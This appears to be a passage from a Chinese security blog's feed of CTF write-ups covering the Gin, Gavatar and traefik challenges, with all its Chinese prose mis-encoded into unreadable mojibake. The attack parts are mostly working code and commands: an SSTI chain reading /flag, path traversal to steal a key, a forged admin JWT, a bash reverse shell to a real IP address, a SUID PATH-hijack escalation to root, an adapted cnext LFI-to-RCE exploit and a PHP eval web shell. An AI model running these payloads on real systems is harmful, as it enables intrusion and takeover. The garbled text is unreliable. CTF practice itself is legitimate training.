class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c:</span>=b.__base__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d:</span>=c.__subclasses__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">e:</span>=d()[156]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">f:</span>=e.__init__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g:</span>=f.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">z:</span>=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">h:</span>=g[z]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">i:</span>=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x:</span>=i(<span class="hljs-name">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">y:</span>=x.read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" alt="image-20250215171805552"></p><h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>å…ˆçœ‹æºç ï¼Œå‘ç°å†downloadè·¯ç”±å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œæ²¡å¯¹è¾“å…¥è¿›è¡Œå¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">func Download(c *gin.Context) &#123;<br>filename := c.DefaultQuery(<span class="hljs-string">&quot;filename&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, nil, <span class="hljs-string">&quot;Filename is required&quot;</span>)<br>&#125;<br>basepath := <span class="hljs-string">&quot;./uploads&quot;</span><br>filepath, _ := url.JoinPath(basepath, filename)<br><span class="hljs-keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">404</span>, nil, <span class="hljs-string">&quot;File not found&quot;</span>)<br>&#125;<br>c.Header(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span>+filename)<br>c.File(filepath)<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬ä¼ <code>filename=../config/key.go</code>æ‹¿åˆ°keyçš„ä¸€éƒ¨åˆ†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> config<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Key</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;r00t32l&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Year</span><span class="hljs-params">()</span></span> <span class="hljs-type">int64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2025</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨çœ‹ä»–çš„keyçš„ç”Ÿæˆé€»è¾‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateKey</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>rand.Seed(config.Year())<br>randomNumber := rand.Intn(<span class="hljs-number">1000</span>)<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())<br><span class="hljs-keyword">return</span> key<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç”Ÿæˆkey</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" alt="image-20250215172821196"></p><p>æ‹¿åˆ°keyé‚£å°±å¯ä»¥è¿›è¡Œjwtä¼ªé€ ç”Ÿæˆadminçš„token</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN<span class="hljs-number">1</span>YiI<span class="hljs-number">6</span>InVzZXIgdG<span class="hljs-number">9</span>rZW<span class="hljs-number">4</span>iLCJleHAiOjE<span class="hljs-number">3</span>Mzk<span class="hljs-number">2</span>OTc<span class="hljs-number">3</span>NjQsImlhdCI<span class="hljs-number">6</span>MTczOTYxMTM<span class="hljs-number">2</span>NH<span class="hljs-number">0</span>.ARUWYZnXAJTR<span class="hljs-number">0</span>QmR-Vn<span class="hljs-number">4e49</span>HEPI<span class="hljs-number">1</span>o<span class="hljs-number">4</span>CpSvrxP<span class="hljs-number">3</span>NBVgM<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œrceäº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>    re := regexp.MustCompile(importRegex)<br>    matches := re.FindStringSubmatch(code)<br>    imports := matches[<span class="hljs-number">0</span>]<br>    log.Println(imports)<br>    <span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è®©os&#x2F;execï¼Œæˆ‘ä»¬ç”¨syscall</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    syscall.Exec(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>&#125;, []<span class="hljs-type">string</span>&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>åå¼¹shell</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">8.138.181.58</span>/<span class="hljs-number">32771 0</span>&gt;&amp;<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" alt="image-20250215174943757"></p><p>å‡çš„ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰suidææƒ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/usr/bin/chsh<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/su</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/sudo</span><br><span class="hljs-regexp">/.../</span>Cat<br></code></pre></td></tr></table></figure><p>æœ‰ä¸ª&#x2F;â€¦&#x2F;Catè¿è¡Œæ—¶ï¼Œå…¶å®æ˜¯è¿è¡Œäº†<code>system(&#39;cat /flag&#39;)</code>é‚£æˆ‘ä»¬å°è¯•ç¯å¢ƒå˜é‡åŠ«æŒcatå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash&#x27;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> +x /tmp/cat <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>/.../Cat<br></code></pre></td></tr></table></figure><p>å‘ç°æˆ‘ä»¬çš„æƒé™å˜æˆroot</p><p>å†æ‹¿flagï¼Œä¸èƒ½ç”¨catäº†</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" alt="image-20250215175852729"></p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqliteæ³¨å…¥</tag>
      
      <tag>linuxææƒ</tag>
      
      <tag>æ—¶é—´ç›²æ³¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf</title>
    <link href="/2025/02/09/n1ctf/"/>
    <url>/2025/02/09/n1ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="n1ctf"><a href="#n1ctf" class="headerlink" title="n1ctf"></a>n1ctf</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>n1æˆ˜é˜Ÿçš„æ‹›æ–°èµ›ï¼Œé¢˜ç›®éƒ½éå¸¸æœ‰æ·±åº¦ï¼Œå¹³æ—¶çš„çŸ¥è¯†ç‚¹ä½†æ˜¯å¾ˆæ·±å…¥ï¼Œå†™ä¹‹å‰è¿˜æŠ±æœ‰ä¸€ä¸è¿›å…¥æˆ˜é˜Ÿçš„å¹»æƒ³ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ</p><p>å…¨æ˜¯å¤§ä½¬</p><p><strong>å†™å‡º4é¢˜å…¶ä¸­<code>Easydb</code>æ˜¯åœ¨<code>23ï¼š08</code>å†™å‡ºæäº¤</strong></p><h2 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h2><p>å†™äº†å¾ˆä¹…ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œæœ‰ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯é‚£ä¸ªæƒé™å®åœ¨æ²¡æ³•ç»•</p><p>åé¢çªç„¶æƒ³èµ·è¿™æ˜¯LFIé‚£æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨å»å¹´é‚£ä¸ªcveï¼Œç»“æœå°±æˆäº† ^_^</p><p><a href="https://xz.aliyun.com/news/14127">LFIåˆ°RCE</a>æ„Ÿè°¢<a href="https://blog.kengwang.com.cn/archives/640/?replyTo=535">kengwang</a>å¸ˆå‚…è®©æˆ‘äº†è§£</p><p>ç°åœ¨åˆ†æä¸€ä¸‹æˆ‘çš„æ€è·¯</p><p>åˆ†ææºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">upload.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€ä¸ª<code>file_get_contents</code>å‡½æ•°</p><p>æ–‡ä»¶ä¸Šä¼ é‚£å—æµ‹äº†å¾ˆä¹…ï¼Œç»“æœmimeç±»å‹ä¸€ç›´é”™ï¼Œå€’æ˜¯<code>file_get_contents</code>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>æ‹¿åˆ°äº†ä¸€äº›ä¸œè¥¿</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3522418a-e150-41b3-9a7d-ac41d3f4576a&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$2y$10$TJqRZATYatGq16hhzgFNye.mJ83nblneeHXFFIArCsInETF1l2IXy&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡å•¥ç”¨ï¼Œå¡äº†å‡ ä¸ªå°æ—¶</p><p><strong>æ­£ç¡®æ–¹æ³•ï¼š</strong></p><p>LFI to RCE</p><p><a href="https://www.cnblogs.com/ddd-flag">å…·ä½“åŸç†å‚è€ƒ</a></p><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">è„šæœ¬åœ°å€</a></p><p>æŠŠRomoteç±»æ”¹æˆè¿™æ ·â€”-æ³¨æ„ç”¨æˆ·åå’Œcookieæ›¿æ¢æˆè‡ªå·±çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br>        <span class="hljs-variable language_">self</span>.session.headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=3b3e88b173b7a66ef0d737c1d6dd92b6&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        files = &#123;<br>        <span class="hljs-string">&quot;avatar&quot;</span>: (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>),  <span class="hljs-comment"># ç©ºæ–‡ä»¶</span><br>        <span class="hljs-string">&quot;url&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>),  <span class="hljs-comment"># æ™®é€šå­—æ®µ</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;url:  <span class="hljs-subst">&#123;self.url&#125;</span>&quot;</span>)<br>        req1=<span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, files=files)<br>        req2=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mysend</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        req=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> base64.decode(data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>è¿è¡Œpoc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py http://39.106.16.204:12626/ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27;</span> &gt; 1.php<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®1.php POSTä¼ å‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png" alt="image-20250209224407146"></p><h2 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h2><p>æºç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;archive/zip&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&quot;./uploads&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipSimpleFile</span><span class="hljs-params">(file *zip.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>outFile, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> outFile.Close()<br><br>fileInArchive, err := file.Open()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> 